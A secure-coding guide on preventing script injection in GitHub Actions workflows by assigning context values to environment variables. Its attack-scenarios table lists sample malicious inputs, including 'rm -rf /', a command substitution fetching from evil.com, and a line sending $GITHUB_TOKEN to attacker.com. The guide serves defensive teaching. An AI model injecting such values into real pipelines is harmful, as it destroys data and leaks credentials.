# GitHub Actions: Preventing Script Injection

## Overview

Direct interpolation of context variables in shell commands is a **critical security vulnerability**. Values must be assigned to environment variables first to prevent code execution.

## The Problem: Script Injection

### What Happens

When you use values directly in `run:` scripts, the shell interprets them as **code**, not data.

```yaml
# ❌ VULNERABLE
- run: echo "${{ vars.FOO }}"
```

### Attack Scenarios

| Scenario | Malicious Value | Result |
|----------|-----------------|--------|
| Command injection | `test; rm -rf /` | Deletes files |
| Command substitution | `$(curl evil.com)` | Executes remote command |
| Quote escaping | `foo'bar'$(whoami)` | Breaks syntax, executes code |
| Secret exfiltration | `pass; curl attacker.com?token=$GITHUB_TOKEN` | Leaks credentials |

## The Solution: Environment Variables

### Safe Pattern

```yaml
# ✅ SAFE
- env:
    MY_VAR: ${{ vars.FOO }}
    MY_SECRET: ${{ secrets.API_TOKEN }}
  run: echo "$MY_VAR"
```

**Why it works:** Environment variables are treated as data, not code. Shell metacharacters are literal text.

## Comparison

| Approach | Usage | Risk Level | Notes |
|----------|-------|-----------|-------|
| Direct interpolation | `echo "${{ vars.FOO }}"` | 🔴 Critical | Vulnerable to injection |
| Env variable assignment | `env: { VAR: ${{ vars.FOO }} }` | 🟢 Safe | Standard best practice |
| Escaped shell | `echo '${{ vars.FOO }}'` | 🟡 Risky | Single quotes prevent some attacks but not all |

## Best Practice Template

```yaml
- name: Process user input safely
  env:
    # Assign ALL dynamic values first
    PR_TITLE: ${{ github.event.pull_request.title }}
    CONFIG: ${{ vars.MY_CONFIG }}
    TOKEN: ${{ secrets.API_TOKEN }}
    BUILD_ID: ${{ github.run_id }}
  run: |
    echo "PR: $PR_TITLE"
    curl -H "Authorization: Bearer $TOKEN" \
      -d "config=$CONFIG&build=$BUILD_ID" \
      https://api.example.com/deploy
```

## Key Rules

### ✅ Must Do

- **Always** assign context values to env variables before using in shell
- Use double quotes when referencing env variables: `"$VAR"` not `$VAR`
- Mask sensitive values: `echo "::add-mask::${{ secrets.SENSITIVE }}"`

### ❌ Must NOT Do

- ❌ Direct interpolation: `${{ vars.FOO }}`
- ❌ Inline execution: `${{ secrets.PASS }}`
- ❌ Command substitution with values: `echo "$(eval ${{ vars.CMD }})"`
- ❌ Unquoted variables: `echo $VAR` (allows word splitting)

## Real-World Example

### Vulnerable Code

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -X POST https://api.example.com/deploy \
            -d "user=${{ github.actor }}" \
            -d "branch=${{ github.ref }}" \
            -d "token=${{ secrets.API_KEY }}"
```

**Problem:** If `github.actor` or `github.ref` contain shell metacharacters, injection occurs.

### Secure Code

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy safely
        env:
          ACTOR: ${{ github.actor }}
          BRANCH: ${{ github.ref }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          curl -X POST https://api.example.com/deploy \
            -d "user=$ACTOR" \
            -d "branch=$BRANCH" \
            -d "token=$API_KEY"
```

## Related Security Practices

| Practice | Purpose |
|----------|---------|
| **Action pinning** | Pin to commit SHA, not floating tags |
| **Credential masking** | Use `::add-mask::` for sensitive values in logs |
| **Least privilege** | Define minimal permissions per job |
| **OIDC authentication** | Use short-lived tokens instead of long-lived credentials |
| **Persist-credentials: false** | Don't persist Git credentials to disk |

## Tools for Validation

```bash
# Validate workflow syntax and security issues
actionlint                # Syntax & semantic checks
zizmor .                  # Security static analysis
```

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Dangerous Workflow Patterns](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injection)
- [Environment Variables in Workflows](https://docs.github.com/en/actions/learn-github-actions/environment-variables)
